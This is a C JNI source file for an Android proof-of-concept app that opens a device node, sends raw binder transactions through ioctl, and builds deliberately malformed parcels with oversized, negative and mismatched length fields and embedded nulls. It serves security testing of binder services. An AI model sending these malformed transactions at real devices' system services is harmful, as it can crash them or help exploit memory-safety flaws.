#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/types.h>

#include "binder.h"

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

jbyteArray Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv*, jclass, jint, jint, jint, jint, jbyteArray);

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeOpenDevice(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return -1;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return -1;
    int fd = open(cpath, O_RDWR);
    if (fd < 0) {
        LOGE("open(%s) failed: %s", cpath, strerror(errno));
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        return -errno;
    }
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    return fd;
}

JNIEXPORT jbyteArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv* env, jclass clazz,
                                                             jint fd, jint handle, jint code, jint flags, jbyteArray data) {
    uint8_t* tx_data = NULL;
    size_t tx_data_size = 0;
    if (data != NULL) {
        tx_data_size = (*env)->GetArrayLength(env, data);
        tx_data = malloc(tx_data_size);
        if (tx_data == NULL) {
            LOGE("malloc failed");
            return NULL;
        }
        (*env)->GetByteArrayRegion(env, data, 0, tx_data_size, (jbyte*)tx_data);
    }

    size_t cmd_size = sizeof(uint32_t) + sizeof(struct binder_transaction_data);
    size_t total_size = cmd_size + tx_data_size;
    uint8_t* buf = malloc(total_size);
    if (buf == NULL) {
        if (tx_data) free(tx_data);
        LOGE("malloc for buffer failed");
        return NULL;
    }

    uint32_t* cmd = (uint32_t*)buf;
    *cmd = BC_TRANSACTION;
    struct binder_transaction_data* tdata = (struct binder_transaction_data*)(buf + sizeof(uint32_t));
    memset(tdata, 0, sizeof(struct binder_transaction_data));
    tdata->target.handle = (uint32_t)handle;
    tdata->code = (uint32_t)code;
    tdata->flags = (uint32_t)flags;
    tdata->data_size = tx_data_size;
    tdata->offsets_size = 0;
    tdata->data.ptr.buffer = (binder_uintptr_t)(buf + cmd_size);
    tdata->data.ptr.offsets = 0;

    if (tx_data_size > 0 && tx_data != NULL) {
        memcpy(buf + cmd_size, tx_data, tx_data_size);
    }

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = total_size;
    bwr.write_buffer = (binder_uintptr_t)buf;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);

    if (tx_data) free(tx_data);
    free(buf);

    if (ret < 0) {
        LOGE("ioctl failed: %s (handle=%d, code=%d, data_size=%zu)",
             strerror(errno), handle, code, tx_data_size);
        return NULL;
    }
    if (bwr.read_consumed == 0) {
        return NULL;
    }

    jbyteArray result = (*env)->NewByteArray(env, bwr.read_consumed);
    (*env)->SetByteArrayRegion(env, result, 0, bwr.read_consumed, (jbyte*)read_buf);
    return result;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderDumpReply(JNIEnv* env, jclass clazz,
                                                           jint fd, jint handle, jint code, jint flags, jbyteArray data) {
    jbyteArray reply = Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(
            env, clazz, fd, handle, code, flags, data);
    char result[256] = {0};
    if (reply != NULL) {
        jsize len = (*env)->GetArrayLength(env, reply);
        uint8_t* buf = malloc(len + 1);
        if (buf) {
            (*env)->GetByteArrayRegion(env, reply, 0, len, (jbyte*)buf);
            buf[len] = '\0';
            if (len <= 32) {
                char hex[128] = {0};
                int pos = 0;
                for (int i = 0; i < len && i < 32; i++) {
                    pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", buf[i]);
                }
                snprintf(result, sizeof(result), "len=%d hex: %s", len, hex);
            } else {
                snprintf(result, sizeof(result), "len=%d", len);
            }
            free(buf);
        } else {
            snprintf(result, sizeof(result), "len=%d", len);
        }
        (*env)->DeleteLocalRef(env, reply);
    } else {
        snprintf(result, sizeof(result), "ERROR: no reply or ioctl failed");
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jbyteArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeBuildMalformedParcel(JNIEnv* env, jclass clazz, jint type, jint extra) {
    uint8_t* data = NULL;
    int len = 0;

    switch (type) {
        case 0: // empty data (no parcel)
            return NULL;

        case 1: // length field only (no string)
            len = 4;
            data = malloc(len);
            if (data == NULL) return NULL;
            memset(data, 0, len);
            data[0] = 0x01;
            data[1] = 0x00;
            data[2] = 0x00;
            data[3] = 0x00;
            break;

        case 2: // length > actual data (len=100, data="a")
            len = 4 + 2;
            data = malloc(len);
            if (data == NULL) return NULL;
            memset(data, 0, len);
            data[0] = 100;
            data[1] = 0;
            data[2] = 0;
            data[3] = 0;
            data[4] = 'a';
            data[5] = 0;
            break;

        case 3: // length < actual data (len=1, data="test\0")
            len = 4 + 5;
            data = malloc(len);
            if (data == NULL) return NULL;
            memset(data, 0, len);
            data[0] = 1;
            data[1] = 0;
            data[2] = 0;
            data[3] = 0;
            memcpy(data + 4, "test", 4);
            data[8] = 0;
            break;

        case 4: // data with null bytes inside (invalid string)
            len = 4 + 10;
            data = malloc(len);
            if (data == NULL) return NULL;
            memset(data, 0, len);
            data[0] = 10;
            data[1] = 0;
            data[2] = 0;
            data[3] = 0;
            memcpy(data + 4, "a\0b\0c\0d\0", 8);
            break;

        case 5: // length with negative value (0xFFFFFFFF)
            len = 4;
            data = malloc(len);
            if (data == NULL) return NULL;
            memset(data, 0xFF, len);
            break;

        case 6: // extra large length (0x7FFFFFFF)
            len = 4;
            data = malloc(len);
            if (data == NULL) return NULL;
            data[0] = 0xFF;
            data[1] = 0xFF;
            data[2] = 0xFF;
            data[3] = 0x7F;
            break;

        default:
            return NULL;
    }

    jbyteArray result = (*env)->NewByteArray(env, len);
    if (result != NULL) {
        (*env)->SetByteArrayRegion(env, result, 0, len, (jbyte*)data);
    }
    free(data);
    return result;
}
